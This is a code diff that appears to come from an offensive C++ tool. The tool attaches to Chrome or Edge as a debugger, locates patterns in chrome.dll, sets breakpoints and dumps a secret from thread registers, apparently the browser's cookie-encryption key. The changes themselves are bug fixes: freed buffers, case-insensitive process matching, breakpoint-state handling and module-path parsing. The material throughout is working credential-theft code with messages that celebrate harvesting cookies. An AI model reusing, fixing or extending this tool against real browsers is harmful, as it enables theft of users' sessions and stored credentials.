@@ -154,7 +154,7 @@ BOOL FindAndTerminateProcess(wchar_t* processName) {
     HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcessSnap == INVALID_HANDLE_VALUE)
     {
-        printf("CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
+        printf("[-] CreateToolhelp32Snapshot failed, Error: %d\n", GetLastError());
         return FALSE;
     }
 
@@ -163,14 +163,14 @@ BOOL FindAndTerminateProcess(wchar_t* processName) {
 
     if (!Process32First(hProcessSnap, &pe32))
     {
-        printf("Process32First failed, Error: %d\n", GetLastError());
+        printf("[-] Process32First failed, Error: %d\n", GetLastError());
         CloseHandle(hProcessSnap);
         return FALSE;
     }
 
     do
     {
-        if (wcscmp(pe32.szExeFile, processName) == 0)
+        if (_wcsicmp(pe32.szExeFile, processName) == 0)
         {
             HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
 
@@ -299,6 +299,7 @@ uintptr_t FindXREF(HANDLE hProcess, uintptr_t moduleBaseAddr, uintptr_t targetAd
             if (target == targetAddress) {
                 uintptr_t address = (sectionBase + i);
                 printf("[+] Found target XREF at: 0x%016llx, Section: 0x%016llx, Offset:  0x%Ix\n", address, sectionBase, i);
+                delete[] buffer;
                 return address;
             }
             i++;
@@ -309,6 +310,7 @@ uintptr_t FindXREF(HANDLE hProcess, uintptr_t moduleBaseAddr, uintptr_t targetAd
     }
 
     printf("[-] Failed to find the pattern in 0x%016llx section.\n", sectionBase);
+    delete[] buffer;
     return 0;
 }
 
@@ -331,6 +333,7 @@ uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, 
             if (memcmp(buffer + i, pattern, patternLen) == 0) {
                 uintptr_t resultAddress = sectionBase + i;
                 printf("[*] Found pattern on Address: 0x%016llx, Section base: 0x%016llx, Offset: 0x%Ix\n", resultAddress, sectionBase, i);
+                delete[] buffer;
                 return resultAddress;
             }
         }
@@ -340,6 +343,7 @@ uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, 
     }
 
     printf("[-] Failed to find the pattern in 0x%016llx section.\n", sectionBase);
+    delete[] buffer;
     return 0;
 }
 
@@ -348,7 +352,7 @@ void DumpSecret(HANDLE hProc, HANDLE hThread) {
     ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;
 
     if (!GetThreadContext(hThread, &ctx)) {
-        printf("GetThreadContext failed: %lu\n", GetLastError());
+        printf("[-] GetThreadContext failed: %d\n", GetLastError());
         CloseHandle(hThread);
         return;
     }
@@ -425,7 +429,6 @@ BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {
 void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32) {
     DEBUG_EVENT debugEvent;
     uintptr_t breakpointAddress = 0x00;
-    bool breakPointSet = false;
 
     if (waitTime == 0)
         waitTime = INFINITE;
@@ -438,7 +441,7 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
             // Uncomment this and you will know why it is commented out even on debug builds
             //printf("[*] Exception occurred at address: 0x%llx", exceptionRecord.ExceptionAddress);
 
-            if (useHW)
+            if (useHW && breakpointAddress != 0)
             {
                 if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT &&
                     debugEvent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) {
@@ -467,7 +470,7 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
             }
             else {
                 // Check if the hit breakpoint is the one we set
-                if (exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
+                if (!useHW && exceptionRecord.ExceptionAddress == (LPCVOID)breakpointAddress) {
                     printf("[+] Thread: %d hit the breakpoint at: 0x%p\n", debugEvent.dwThreadId, exceptionRecord.ExceptionAddress);
 
                     HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, debugEvent.dwThreadId);
@@ -521,7 +524,7 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
         case LOAD_DLL_DEBUG_EVENT: {
 
             //already set the breakpoint
-            if (breakPointSet)
+            if (breakpointAddress != 0)
                 break;
 
             // Identify chrome.dll when it loads
@@ -587,14 +590,12 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                                 return;
                             }
                         }
-                        breakPointSet = true;
                     }
                     else {
                         if (!SetBreakPoint(hProcess, breakpointAddress)) {
                             printf("[-] Failed to set the breakpoint.\n");
                             return;
                         }
-                        breakPointSet = true;
                     }
                 }
             }
@@ -716,19 +717,19 @@ int main(int argc, char* argv[]) {
 
     //This is important
     banner();
-    printf("Hope your browser profile has a lot cookies!\n\n");
+    printf("How am I supposed to use the key though?\n\n");
 
     //Use provided path if one was given
     if (wcslen(path) > 0)
         targetExecutable = reinterpret_cast<const wchar_t*>(path);
 
     //Use provided module if one was given
-    if (wcslen(path) > 0)
+    if (wcslen(module) > 0)
         targetModule = reinterpret_cast<const wchar_t*>(module);
 
     if (targetModule == L"" || targetExecutable == L"")
     {
-        printf("[-] Flags /Edge or /Chrome are reqruired\n");
+        printf("[-] Flags /Edge, /Chrome or /Path and /Module are reqruired\n");
         usage();
         return 0;
     }
